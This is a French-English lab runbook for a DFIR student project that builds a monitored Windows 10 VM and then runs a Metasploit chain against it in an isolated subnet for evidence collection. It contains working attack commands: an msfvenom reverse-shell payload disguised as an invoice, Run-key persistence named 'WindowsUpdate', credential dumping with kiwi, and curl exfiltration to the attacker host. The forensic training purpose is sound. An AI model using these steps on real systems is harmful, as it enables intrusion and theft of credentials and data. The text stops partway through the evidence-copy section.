# Projet 4 — Semaine 0 (build WKSTN01, run the attack, freeze the evidence)

**Scope.** One intensive day à deux. Build the only new VM (`WKSTN01`,
Windows 10). Install Sysmon (SwiftOnSecurity config) + Wazuh agent, verify
events reach the existing dashboard, snapshot the clean baseline. Then run
the Metasploit chain end to end with **B driving** and **A observing +
preserving**. At the end we hold a sealed evidence folder: suspended-state
`.vmem` (memory), `.vmdk` copy (disk), PCAP, `.evtx` exports, Wazuh alert
export — every file SHA-256 hashed, custody manifest signed.

**Reused from LogSentinel (do not touch):**
- `rhel-wazuh` 192.168.100.10 — Wazuh 4.14.6 Docker stack, rule `100100` live.
  Container name is `single-node-wazuh.manager-1` (plus `.indexer-1` and
  `.dashboard-1`). The `wazuh.manager` shortname from the docs doesn't resolve.
- `kali` 192.168.100.30 — attacker platform
- VMnet10 host-only, 192.168.100.0/24

**New in this phase:** `WKSTN01` 192.168.100.40 — Windows 10 Pro, Sysmon
+ Wazuh agent + an unlucky user who double-clicks the wrong `.exe`.

**Roles for S0.** B (Aladine) attacks. A (Oussama) observes, times, preserves.
Build steps in §1–§6 are joint. §7 is B. §8–§10 are A watching while B runs
through §9's chain.

**Format.** Same as LogSentinel runbooks: numbered sections with inline
`Watch out` callouts, each section closed by `Checkpoint` + `Live run ⬜
pending`. Fill the `Live run` slots as you go; don't rewrite upstream sections
on every retry — only once a step is confirmed functional end to end.

> **Watch out — every single PowerShell session in the VM must be elevated.**
> Not just the one you start with. If you close and reopen PowerShell inside
> WKSTN01, right-click → "Run as administrator" again. The prompt
> `C:\Windows\system32>` means you are admin; `C:\Users\<name>>` means you
> are not. All the registry, Defender, AuditPol, SMB share and `wevtutil
> epl Security` calls below fail silently or loudly without admin.

---

## 0. Prerequisites (one-time check before touching anything)

Before you start, confirm the reused LogSentinel pieces are up:

```bash
# On rhel-wazuh
sudo docker ps --format 'table {{.Names}}\t{{.Status}}' | grep wazuh
# Expect three rows: single-node-wazuh.{manager,indexer,dashboard}-1

sudo docker exec single-node-wazuh.manager-1 \
    /var/ossec/bin/wazuh-control status | grep -E 'is running'

curl -s -k -u admin:'Wazuh2026!' \
    https://127.0.0.1:9200/_cat/indices/wazuh-alerts-*?v | head
```

```bash
# On kali
ip -4 addr show eth0 | grep 'inet 192.168.100.30'
msfconsole -q -x 'version; exit'   # confirms msf present + prints version
```

Host-side quick inventory:

```bash
# On your laptop (VMware host)
free -h | head -2         # confirm ≥ 10 GB free RAM for S0 (we'll use ~9)
df -h ~ | tail -1          # confirm ≥ 60 GB free for the new VM + evidence
```

> **Watch out — don't start WKSTN01 build while the monitored RHEL VM from
> LogSentinel is still running.** You need its RAM back. Suspend it:
> `vmrun suspend <path>/monitored.vmx` (or GUI → Suspend). Resume at end
> of S0 if you still want it for other work.

**Checkpoint:** Wazuh manager + indexer + dashboard all running; Kali on `.30`;
host has free RAM/disk budget for one more VM.
**Live run:** ⬜ _pending_ — manager status `_______`, Kali reachable from
rhel-wazuh (`ping 192.168.100.30` → `____% loss`), free RAM `____ GB`, free
disk `____ GB`.

---

## 1. Create the WKSTN01 VM in VMware

Keep the shape consistent with LogSentinel VMs:

| Setting           | Value                                          |
|-------------------|------------------------------------------------|
| Guest OS          | Microsoft Windows 10 x64                       |
| vCPU              | 2                                              |
| RAM               | 3 GB (3072 MB)                                 |
| Disk              | 50 GB, split, thin-provisioned, SCSI           |
| Network adapter 1 | **Custom → VMnet10** (host-only, 192.168.100.0/24) |
| Network adapter 2 | **(none)** — no NAT, no internet               |
| USB / sound / printer | removed                                    |
| Firmware          | BIOS (not UEFI) — simpler for Volatility later |

> **Watch out — do NOT add a NAT adapter to WKSTN01.** The whole scenario
> relies on an airgapped host-only subnet. A second NAT would let the
> Meterpreter payload phone home elsewhere and your PCAP would be dirty.
> Kali may keep its NAT adapter (needed to download the Metasploit payload
> and the Wazuh agent MSI from the internet in §7).

Create the VM but **do not start it yet**. Save the `.vmx` path somewhere
you'll remember — you'll need it for `vmrun` in §10. In this live run the
path was `C:\VMs\WKSTN01\WKSTN01.vmx`; adapt to yours.

```bash
# Example — find it from your layout
ls C:\VMs\WKSTN01\WKSTN01.vmx   # or wherever VMware stashed it
```

**Checkpoint:** empty VM created, VMnet10 only, powered off, `.vmx` path
noted.
**Live run:** ⬜ _pending_ — `.vmx` path: `________________________________`.

---

## 2. Install Windows 10 + baseline configure

Use a Windows 10 Pro 22H2 ISO (the SwiftOnSecurity Sysmon config and most
public YARA rules target this baseline). During install:

- Edition: **Pro** (needed later for GPO-style policies in §5 preventions)
- Account: **local account** — any name works. Whatever you pick becomes
  your `$env:USERPROFILE` and shows up in paths like
  `C:\Users\<yourname>\Downloads`. Password `Analyst123!` or similar;
  keep it predictable because we'll `hashdump` it later.
- Region: skip online, skip Cortana, skip MS account, skip telemetry prompts
  (Shift+F10 → `OOBE\BYPASSNRO` on the network screen if it forces you online)
- Join: workgroup only (no domain — DC01 is out of scope per architecture doc)

Once at the desktop, **open PowerShell as administrator** (right-click Start
→ Windows PowerShell (Admin)) and confirm elevation **before anything else**:

```powershell
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
# → must print True. If False, close and reopen as admin.
```

> **Watch out — the un-elevated session will NOT give you a meaningful
> error.** `New-NetIPAddress` fails as "System.Object[] → UInt32"
> (misleading); `Set-DnsClientServerAddress` says "Access to a CIM
> resource was not available" **once per interface and spams 25 copies**
> because PowerShell binds the array of indices and loops; `Set-MpPreference`
> says "You don't have enough permissions". None of this means your syntax
> is wrong. It means you aren't admin.

Then apply the baseline **in this order**:

```powershell
# a) static IP on VMnet10 — pick adapter BY NAME to avoid the array trap
Get-NetAdapter | Format-Table Name, InterfaceIndex, Status -AutoSize
# In a fresh VM there's typically one adapter named "Ethernet0". Use that:
$ifIdx = (Get-NetAdapter -Name 'Ethernet0').ifIndex

# NOTE: no -DefaultGateway. Host-only subnet, no internet by design.
# Setting a gateway here will try to steal your host's default route if you
# ever run this block on the host by mistake.
New-NetIPAddress -InterfaceIndex $ifIdx -IPAddress 192.168.100.40 `
    -PrefixLength 24
Set-DnsClientServerAddress -InterfaceIndex $ifIdx `
    -ServerAddresses ('192.168.100.10')
```

> **Watch out — `Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }`
> returns `Object[]` on a VMware host (14+ VMnetX interfaces) and makes
> `New-NetIPAddress` throw "Cannot convert System.Object[] to UInt32".**
> This is the single most common failure of this phase. Always pick the
> adapter by name (`-Name 'Ethernet0'`). Inside the VM it's usually
> `Ethernet0`; outside, you don't want to run this at all.

```powershell
# b) hostname + time
Rename-Computer -NewName "WKSTN01" -Force
w32tm /config /manualpeerlist:"192.168.100.10" /syncfromflags:manual /update
Start-Service w32time
w32tm /resync

# c) enable Process Creation auditing + command line field
#    Use the subcategory GUID so this works on any locale (fr-FR, en-US, etc.)
AuditPol /set /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" `
    /success:enable /failure:enable
reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit' `
    /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# d) PowerShell logging (surfaces mimikatz nicely)
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    /v EnableModuleLogging /t REG_DWORD /d 1 /f

# e) tame Defender — Tamper Protection must be OFF via GUI first:
#    Settings → Windows Security → Virus & threat protection →
#    Manage settings → Tamper Protection = Off, Real-time = Off,
#    Cloud-delivered = Off
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true
Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"

Restart-Computer -Force
```

> **Watch out — `AuditPol` with the French subcategory name "Création du
> processus" fails on en-US Windows and vice versa, with the misleading
> error `0x00000057 The parameter is incorrect`.** Use the GUID
> `{0CCE922B-69AE-11D9-BED3-505054503030}` — it's locale-independent.

> **Watch out — Tamper Protection.** If you leave it on, `Set-MpPreference
> -DisableRealtimeMonitoring $true` fails with
> `HRESULT 0xc0000142 You don't have enough permissions` **even as admin**.
> There is no CLI for Tamper Protection — only the GUI toggle. Also
> disable Real-time + Cloud-delivered in the same screen while you're there.

> **Watch out — audit the baseline, don't trust the UI.** After reboot:
> `auditpol /get /category:"*"` must show
> `Process Creation            Success and Failure` (or the French equivalent).
> If it says No Auditing, re-run the `AuditPol /set` line with the GUID.

**Checkpoint:** `WKSTN01` boots clean to desktop, IP `.40`, pingable from
rhel-wazuh and Kali, Defender real-time off, process-creation audit on,
PowerShell logging on.
**Live run:** ⬜ _pending_ — `ping 192.168.100.40` from Kali: `____% loss`,
`Get-MpPreference | select DisableRealtimeMonitoring` → `_____`,
`auditpol` process creation: `_____________________`.

---

## 3. Install Sysmon (SwiftOnSecurity config)

VMware Tools isn't installed yet so shared folders don't work. Transfer files
via HTTP from Kali (Kali has internet via its NAT adapter; WKSTN01 pulls
over the host-only link).

**On Kali** — one-time stage:

```bash
mkdir -p ~/dfir-wk0/stage && cd ~/dfir-wk0/stage
wget -q https://download.sysinternals.com/files/Sysmon.zip
wget https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
unzip -o Sysmon.zip Sysmon64.exe Eula.txt

# Sanity check: config must be ~120 KB, NOT 0
ls -la Sysmon64.exe sysmonconfig-export.xml
```

> **Watch out — a `wget -q` on `sysmonconfig-export.xml` can silently write
> a 0-byte file** if GitHub returns a transient error or if your Kali has
> flaky DNS. Always check the size (expect ~123 KB). If zero, re-run
> without `-q`, and if DNS is the problem see §7's DNS fix.

Then serve the stage dir over HTTP:

```bash
cd ~/dfir-wk0/stage
python3 -m http.server 8080
# Leave this running in its own terminal — we reuse port 8080 all phase.
```

**On WKSTN01** (elevated PowerShell), pull and install:

```powershell
mkdir C:\Tools\Sysmon -Force
Invoke-WebRequest -Uri http://192.168.100.30:8080/Sysmon64.exe `
    -OutFile C:\Tools\Sysmon\Sysmon64.exe
Invoke-WebRequest -Uri http://192.168.100.30:8080/sysmonconfig-export.xml `
    -OutFile C:\Tools\Sysmon\sysmonconfig-export.xml

Get-ChildItem C:\Tools\Sysmon\ | Format-Table Name, Length -AutoSize
# Sysmon64.exe → ~3.2 MB, sysmonconfig-export.xml → ~120 KB

# Install as a service — must be invoked with & for absolute path in PS
& C:\Tools\Sysmon\Sysmon64.exe -accepteula `
    -i C:\Tools\Sysmon\sysmonconfig-export.xml

Get-Service Sysmon64
Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 3 |
    Format-Table TimeCreated, Id, Message -AutoSize
```

Expect: service `Running`, EventID 1 (process create) events already flowing
for whatever's up (explorer, svchost…).

> **Watch out — Sysmon prints `You need to launch Sysmon as an
> Administrator`** if the service install step runs non-elevated, even
> though config validation succeeds. Elevate and re-run just the `& ...
> Sysmon64.exe -accepteula -i ...` line.

> **Watch out — Sysmon service name is `Sysmon64` on x64, not `Sysmon`.**
> `Get-Service Sysmon` returns "cannot be found" and panic ensues.

**Checkpoint:** `Sysmon64` service running, operational channel accumulating
events, SwiftOnSecurity config loaded (`& C:\Tools\Sysmon\Sysmon64.exe -c`
prints config hash).
**Live run:** ⬜ _pending_ — config SHA-256 (`sha256sum
sysmonconfig-export.xml` on Kali): `________________________________________________________________`.

---

## 4. Install and enroll the Wazuh agent (4.14.6)

Version lock matters — manager is 4.14.6, so is the agent.

**On the manager first — create the group**:

```bash
# On rhel-wazuh. Note the container name — single-node-wazuh.manager-1,
# not wazuh.manager.
sudo docker exec -it single-node-wazuh.manager-1 \
    /var/ossec/bin/agent_groups -a -g dfir-wk0 -q
sudo docker exec -it single-node-wazuh.manager-1 \
    /var/ossec/bin/agent_groups -l
# Expect: default (1), dfir-wk0 (0)
```

**On Kali** — stage the installer alongside Sysmon:

```bash
cd ~/dfir-wk0/stage
wget https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.6-1.msi
sha256sum wazuh-agent-4.14.6-1.msi
# ~5.7 MB
```

> **Watch out — if `wget` hangs on name resolution** (`Temporary failure in
> name resolution`), your Kali's `/etc/resolv.conf` has only VMware's NAT
> resolver and it's unreachable. Fix:
>
> ```bash
> sudo tee /etc/resolv.conf > /dev/null <<EOF
> nameserver 8.8.8.8
> nameserver 1.1.1.1
> EOF
> ```
>
> NetworkManager will overwrite this on next reboot — fine for one session.

**On WKSTN01** (elevated PowerShell), pull and install:

```powershell
Invoke-WebRequest -Uri http://192.168.100.30:8080/wazuh-agent-4.14.6-1.msi `
    -OutFile C:\Tools\wazuh-agent-4.14.6-1.msi

Start-Process msiexec.exe -Wait -ArgumentList @(
    '/i','C:\Tools\wazuh-agent-4.14.6-1.msi','/qn',
    'WAZUH_MANAGER=192.168.100.10',
    'WAZUH_REGISTRATION_SERVER=192.168.100.10',
    'WAZUH_AGENT_GROUP=dfir-wk0',
    'WAZUH_AGENT_NAME=WKSTN01'
)

Test-Path 'C:\Program Files (x86)\ossec-agent'
# → True

# Enroll via agent-auth (no password — lab shortcut)
Set-Location 'C:\Program Files (x86)\ossec-agent'
.\agent-auth.exe -m 192.168.100.10 -G dfir-wk0 -A WKSTN01
```

Before starting the service, teach the agent to tail Sysmon + PowerShell:

```powershell
$conf = 'C:\Program Files (x86)\ossec-agent\ossec.conf'
$block = @"
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
"@
(Get-Content $conf -Raw) -replace '(</ossec_config>)', ($block + "`r`n`$1") |
    Set-Content $conf -Encoding ASCII

# Sanity: two matches
(Select-String -Path $conf `
    -Pattern 'Microsoft-Windows-Sysmon|Microsoft-Windows-PowerShell').Count

NET START WazuhSvc
Get-Service WazuhSvc
```

Confirm from the manager:

```bash
sudo docker exec single-node-wazuh.manager-1 \
    /var/ossec/bin/agent_control -l | grep WKSTN01
# Expect: ID: 00X, Name: WKSTN01, IP: any (or .40), Active
```

> **Watch out — the MSI's `WAZUH_AGENT_GROUP` kwarg only stores the group
> name locally.** The manager side still needs `agent-auth.exe -G dfir-wk0`
> for the group assignment to stick. Both must agree.

> **Watch out — ossec.conf is ASCII, not UTF-8 BOM.** PowerShell's default
> `Set-Content` adds a BOM on some versions and the agent fails to start
> with a cryptic XML parse error. Use `-Encoding ASCII` (shown above).

**Checkpoint:** agent `Active` on manager, service running on WKSTN01, two
`<localfile>` blocks added.
**Live run:** ⬜ _pending_ — agent ID: `___`, agent status: `________`,
MSI SHA-256: `________________________________________________________________`.

---

## 5. Verify the Sysmon + Wazuh pipeline (clean events reach dashboard)

Trigger something innocuous on WKSTN01 and prove it surfaces:

```powershell
whoami ; hostname ; ipconfig /all | Out-Null ; notepad.exe ; calc.exe
# Close notepad and calc after a second
```

On rhel-wazuh dashboard: `Discover` → index `wazuh-alerts-*`, filter
`agent.name:"WKSTN01"`. Expect **a lot** of events in the first hour (the
SCA baseline scan runs on first enroll — hundreds of CIS Win10 Enterprise
checks). To isolate Sysmon:

```
agent.name:"WKSTN01" and data.win.system.providerName:"Microsoft-Windows-Sysmon"
```

Expect at least a few `data.win.eventdata.image` populated events for your
test processes within ~30s. In the live build we saw 578 total hits in 10
min, 35 of them from Sysmon.

From the manager CLI if the dashboard is slow:

```bash
sudo docker exec single-node-wazuh.manager-1 \
    tail -n 50 /var/ossec/logs/alerts/alerts.log | grep -A1 'WKSTN01'
```

**Checkpoint:** Sysmon process-create events visible in dashboard with
populated `data.win.eventdata` fields; alert count > 0 for
`agent.name:"WKSTN01"` in the last 10 min.
**Live run:** ⬜ _pending_ — alert count last 10 min: `____`, Sysmon-only
count: `____`.

---

## 6. Clean snapshot + SHA-256 baseline

Freeze "pristine" state before anything attack-side touches the VM.

On WKSTN01, close any ad-hoc tool windows but **leave Sysmon and the Wazuh
agent running**. In VMware GUI: **VM → Snapshot → Take Snapshot** → name it
`clean-baseline-pre-attack`.

Then on the host, hash the snapshot files:

```powershell
$vmdir = 'C:\VMs\WKSTN01'   # adapt to your layout
Get-ChildItem $vmdir | Format-Table Name, Length, LastWriteTime -AutoSize

Get-ChildItem $vmdir -Filter '*Snapshot*.vmsn' | Get-FileHash -Algorithm SHA256 |
    Format-Table Algorithm, Hash, Path -AutoSize
Get-ChildItem $vmdir -Filter 'WKSTN01.vmsd' | Get-FileHash -Algorithm SHA256 |
    Format-Table Algorithm, Hash, Path -AutoSize
Get-ChildItem $vmdir -Filter '*-000001.vmdk' | Get-FileHash -Algorithm SHA256 |
    Format-Table Algorithm, Hash, Path -AutoSize
```

Also hash the on-disk tools on Kali — these are the "known-good" tool refs:

```bash
# On kali
mkdir -p ~/dfir-wk0/evidence/00-baseline
cd ~/dfir-wk0/stage
sha256sum Sysmon64.exe sysmonconfig-export.xml wazuh-agent-4.14.6-1.msi \
    | tee ~/dfir-wk0/evidence/00-baseline/tools.sha256
```

> **Watch out — snapshot file names depend on VMware's internal numbering.**
> If you have an earlier snapshot, yours may be `WKSTN01-Snapshot2.vmsn`.
> Use the glob `*Snapshot*.vmsn` (shown above) to catch whatever actually
> exists.

**Checkpoint:** `clean-baseline-pre-attack` snapshot exists in VMware;
baseline hashes written.
**Live run:** ⬜ _pending_ — snapshot name: `________________________`,
`.vmsn` size: `____ MB`.

---

## 7. Prepare the Kali attack platform (B drives)

B generates the payload and sets up the handler + exfil receiver. Nothing
fires at WKSTN01 yet — this is prep.

```bash
mkdir -p ~/dfir-wk0/attack ~/dfir-wk0/evidence/{01-pcap,02-exfil,03-timeline}
cd ~/dfir-wk0/attack

# a) Payload Meterpreter — staged default
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.30 LPORT=4444 \
    -f exe -o invoice_october.exe
sha256sum invoice_october.exe | tee invoice_october.sha256

# b) HTTP exfil sink — python3 -m http.server IGNORES POST bodies which
#    makes the PCAP boring. This 15-line sink logs the body properly.
cat > exfil_server.py <<'PY'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
import os
OUT = os.path.expanduser('~/dfir-wk0/evidence/02-exfil')
os.makedirs(OUT, exist_ok=True)
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        d = self.rfile.read(n)
        fn = os.path.join(OUT, f"exfil_{datetime.utcnow():%Y%m%dT%H%M%SZ}.bin")
        with open(fn, 'wb') as f: f.write(d)
        print(f"[{datetime.utcnow():%H:%M:%S}] POST {self.path} "
              f"{n} bytes -> {fn}", flush=True)
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 8000), H).serve_forever()
PY
chmod +x exfil_server.py

# c) Handler resource file
cat > handler.rc <<'RC'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.30
set LPORT 4444
set ExitOnSession false
exploit -j
RC

# d) Copy payload into stage so http.server :8080 can serve it to WKSTN01
cp invoice_october.exe ~/dfir-wk0/stage/

ls -la ~/dfir-wk0/attack/
```

> **Watch out — don't start the handler or exfil server yet.** They go up
> in §9.1 as the first action **after** A starts tcpdump in §8, so the
> capture window is cleanly bounded.

**Checkpoint:** payload built, SHA-256 recorded, exfil server + handler.rc
staged.
**Live run:** ⬜ _pending_ — payload SHA-256:
`________________________________________________________________`.

---

## 8. A: start preservation collection (right before the attack)

A opens three terminals on Kali. **In this order:**

```bash
# Terminal 1 — PCAP, first so it catches handler bind
sudo tcpdump -i eth0 -s0 -w ~/dfir-wk0/evidence/01-pcap/wk0.pcap \
    'not port 22 and not arp'
# leave running; Ctrl-C at end of §10
```

```bash
# Terminal 2 — attack timeline log, append-only
mkdir -p ~/dfir-wk0/evidence/03-timeline
exec > >(tee -a ~/dfir-wk0/evidence/03-timeline/attack.log) 2>&1
echo "=== S0 attack timeline (host-only 192.168.100.0/24) ==="
echo "A observes. B drives. All times UTC."
date -u +'%Y-%m-%dT%H:%M:%SZ' ; echo "  tcpdump started"
```

For every step B announces, A types in Terminal 2:

```bash
printf '%s  %s\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "B: <description>"
```

Terminal 3 is spare for ad-hoc commands.

> **Watch out — exclude SSH if you SSH into Kali from the host.** The
> `not port 22` filter above handles it. Otherwise PCAP is 90% your session.

**Checkpoint:** tcpdump capturing, timeline log is open and timestamped.
**Live run:** ⬜ _pending_ — PCAP started at `____UTC`.

---

## 9. Attack chain execution (B drives, A times)

Each step: B runs the command, B says "starting X", A hits Enter on the
`printf` line in Terminal 2.

### 9.1 — Handler + exfil server up

```bash
# On kali, two new terminals
cd ~/dfir-wk0/attack
msfconsole -q -r handler.rc            # terminal 4
python3 ./exfil_server.py              # terminal 5
```

A logs: `handler listening on 4444`, `exfil server on 8000`.

Expect in msfconsole: `[*] Started reverse TCP handler on 192.168.100.30:4444`.

### 9.2 — Deliver the payload (phishing simulation)

```powershell
# On WKSTN01 (elevated PowerShell)
# Use $env:USERPROFILE instead of a hardcoded path — profile name = install name
$dl = "$env:USERPROFILE\Downloads"
mkdir $dl -Force

Invoke-WebRequest -Uri http://192.168.100.30:8080/invoice_october.exe `
    -OutFile "$dl\invoice_october.exe"
Test-Path "$dl\invoice_october.exe"   # → True

Start-Process "$dl\invoice_october.exe"
```

A logs: `payload copied`, `payload executed`.

Expect msfconsole: `[*] Sending stage (248902 bytes) to 192.168.100.40` then
`Meterpreter session 1 opened`.

> **Watch out — if Defender re-enabled itself (Windows does this on
> reboot if Tamper Protection crept back on), the exe gets quarantined with
> a toast "Protection contre les virus et menaces → Menaces détectées"
> and the session never opens.** See Appendix A for the fix — do NOT
> rebuild the payload with a different hash or your SHA-256 baseline
> becomes invalid.

### 9.3 — Persistence (Run key, T1547.001)

The classic `post/windows/manage/persistence_exe` module isn't in all
Metasploit builds. Do it manually — more realistic trace anyway. **Drop in
Meterpreter:**

```
# Upload the exe under a stealthy name. The source path on Kali must be
# readable by the user that started msfconsole (don't use /root/... from a
# kali-user msf session).
upload /home/kali/dfir-wk0/attack/invoice_october.exe "C:\\Users\\WKSTN01\\AppData\\Roaming\\sysupdate.exe"

# Add the Run key
reg setval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' `
    -v WindowsUpdate `
    -d 'C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe'

# Verify
reg queryval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' `
    -v WindowsUpdate
```

A logs: `persistence Run key written, value name "WindowsUpdate"`.

> **Watch out — if `upload` fails with "Permission denied"**, the Meterpreter
> handler is running as a user that can't read `/root/...`. Either put the
> payload somewhere world-readable (as above, `/home/kali/...`), or run
> msfconsole as root. Either way adjust the `upload` source path to match.

> **Watch out — if `upload` fails but you continue, the Run key points to
> a non-existent file.** This is actually a decent IOC for S2 (orphaned
> autostart entry) — document it in the custody notes so your Autopsy
> analysis knows the file was planned but never dropped.

### 9.4 — Credential dump (mimikatz via kiwi, T1003.001)

Needs SYSTEM. Meterpreter's `getsystem` works via Named Pipe Impersonation
on Win10 if you're already in a local admin context (which Start-Process
from your admin PowerShell gives you).

```
getsystem
load kiwi
creds_all
lsa_dump_sam
```

A logs: `getsystem OK`, `creds_all executed`, `lsa_dump_sam executed`,
`NTLM hash captured for local user WKSTN01`.

> **Watch out — `creds_all` prints `[!] Not running as SYSTEM, execution may
> fail` if `getsystem` wasn't run.** Dumps may still work partially but
> `lsa_dump_sam` won't. Always `getsystem` first.

### 9.5 — HTTP exfiltration (T1041)

Create a fake sensitive file, then exfil it:

```
shell
```

```cmd
cd C:\Users\WKSTN01\Documents
echo id,name,email,ssn > customers.csv
echo 1,Alice,alice@example.tn,123-45-6789 >> customers.csv
echo 2,Bob,bob@example.tn,987-65-4321 >> customers.csv
echo 3,Carol,carol@example.tn,555-55-5555 >> customers.csv
curl.exe -X POST --data-binary "@customers.csv" ^
    -H "Content-Type: application/octet-stream" ^
    http://192.168.100.30:8000/exfil/customers
exit
```

Confirm on Kali's exfil server terminal:
```
[HH:MM:SS] POST /exfil/customers 133 bytes -> .../exfil_YYYYMMDDTHHMMSSZ.bin
```

Back in Meterpreter:
```
background
```

A logs: `fake customers.csv created, POST exfil to :8000, N bytes received`,
`attack chain complete`.

> **Watch out — exit from the cmd shell, then `background` from the
> Meterpreter prompt.** The `background` command only exists in Meterpreter,
> not in `cmd.exe`. If you type it in the wrong shell cmd prints
> "'background' n'est pas reconnu…". `exit` first.

> **Watch out — don't `exit` the Meterpreter session itself.**
> Backgrounding keeps the session alive so §10's memory capture includes
> the beacon.

**Checkpoint:** all five techniques executed, each announced + logged with
UTC timestamp in `attack.log`.
**Live run:** ⬜ _pending_ — session PID: `____`, Run value name: `________`,
exfil bytes received: `____`.

---

## 10. Freeze: suspend WKSTN01, stop capture, export logs

Order matters. Do NOT shut down or reboot WKSTN01 — you'd lose memory.

### 10.1 — Suspend (freezes memory)

```powershell
# On host (adapt the vmrun path for your VMware version)
& 'C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe' `
    suspend 'C:\VMs\WKSTN01\WKSTN01.vmx'
```

VMware writes a `.vmem` next to the `.vmx`. Note: on recent VMware the file
is **NOT** named `WKSTN01.vmem` — it's `WKSTN01-<8-hex-chars>.vmem`
(e.g. `WKSTN01-3f1f74a8.vmem`). Confirm:

```powershell
Get-ChildItem C:\VMs\WKSTN01\*.vmem | Format-Table Name, Length -AutoSize
# Expect ~3 GB (= RAM size)
```

> **Watch out — `vmrun suspend` sometimes shuts the VM down fully instead
> of suspending it, deleting the `.vmss` state file.** The `.vmem` stays
> around though, and that's the only file Volatility needs. If `.vmss` is
> absent, carry on — don't try to re-suspend.

### 10.2 — Stop PCAP capture (A's Terminal 1)

```
^C
```

```bash
printf '%s  tcpdump stopped\n' "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
    >> ~/dfir-wk0/evidence/03-timeline/attack.log
```

### 10.3 — Export Windows event logs (.evtx)

The clean forensic path is to mount a copy of the suspended disk and copy
`.evtx` out. The pragmatic path: **briefly resume WKSTN01**, export, re-
suspend. Document both windows in attack.log.

```powershell
# On host
& 'C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe' `
    start 'C:\VMs\WKSTN01\WKSTN01.vmx'
# wait ~30 sec for login + agent reconnect
```

```powershell
# On WKSTN01 — ELEVATED PowerShell (Security channel refuses non-admin)
mkdir C:\evidence -Force

$logs = @(
    'Security','System','Application',
    'Microsoft-Windows-Sysmon/Operational',
    'Microsoft-Windows-PowerShell/Operational'
)
foreach ($l in $logs) {
    $fn = 'C:\evidence\' + ($l -replace '[\\/]','_') + '.evtx'
    wevtutil epl $l $fn
}
Get-ChildItem C:\evidence | Format-Table Name, Length -AutoSize
```

> **Watch out — `wevtutil epl Security` returns "Access is denied" without
> admin, but *succeeds silently* on the other channels in the same loop.**
> You end up with 3 of 5 files and no error summary. Always run this block
> in elevated PowerShell.

> **Watch out — `wevtutil epl Microsoft-Windows-Sysmon/Operational` throws
> "channel not found" if the Sysmon service hasn't registered yet.** It
> will have, after step §3. If not, verify with
> `Get-WinEvent -ListLog *Sysmon*`.

Transfer `.evtx` to Kali via a temp SMB share:

```powershell
# On WKSTN01, elevated
New-SmbShare -Name evidence -Path C:\evidence -ReadAccess "Tout le monde" -Temporary
# On fr-FR locales use "Tout le monde", on en-US use "Everyone"
Get-SmbShare -Name evidence
```

```bash
# On Kali
mkdir -p ~/dfir-wk0/evidence/06-evtx
cd ~/dfir-wk0/evidence/06-evtx

# Guest usually denied — authenticate with the WKSTN01 local user
smbclient //192.168.100.40/evidence -U WKSTN01 -c "prompt OFF; mget *.evtx"
# Password prompt — use the local Windows account password
ls -la
```

> **Watch out — SMB firewall may block.** If `smbclient` hangs or returns
> `NT_STATUS_IO_TIMEOUT`, drop the Windows Firewall on WKSTN01
> (`Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`).
> Document the time; prevention in S5 re-enables it.

Clean up and re-suspend:

```powershell
# On WKSTN01, elevated
Remove-SmbShare -Name evidence -Force
Remove-Item C:\evidence -Recurse -Force
```

```powershell
# On host
& 'C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe' `
    suspend 'C:\VMs\WKSTN01\WKSTN01.vmx'
```

### 10.4 — Copy the disk + memory to Kali

The VM is suspended. Copy the full `.vmdk` chain and the `.vmem` from the
host filesystem to a temp staging dir, then share-and-pull from Kali
(scp doesn't exist on Windows by default).

```powershell
# On host, elevated
mkdir C:\dfir-wk0-stage -Force
Copy-Item C:\VMs\WKSTN01\WKSTN01*.vmdk C:\dfir-wk0-stage\
Copy-Item C:\VMs\WKSTN01\WKSTN01-*.vmem C:\dfir-wk0-stage\

New-SmbShare -Name wk0disk -Path C:\dfir-wk0-stage `
    -ReadAccess "Tout le monde" -Temporary
```

```bash
# On Kali
df -h ~   # need ≥ 15 GB free

mkdir -p ~/dfir-wk0/evidence/05-disk ~/dfir-wk0/evidence/04-memory

cd ~/dfir-wk0/evidence/05-disk
# `whoami` on the host prints "<hostname>\<user>"; use that as -U
smbclient //192.168.100.1/wk0disk -U <HOST>/<user> \
    -c "prompt OFF; recurse OFF; mget *.vmdk"

cd ~/dfir-wk0/evidence/04-memory
smbclient //192.168.100.1/wk0disk -U <HOST>/<user> \
    -c "prompt OFF; recurse OFF; mget *.vmem"
```

```powershell
# On host — cleanup
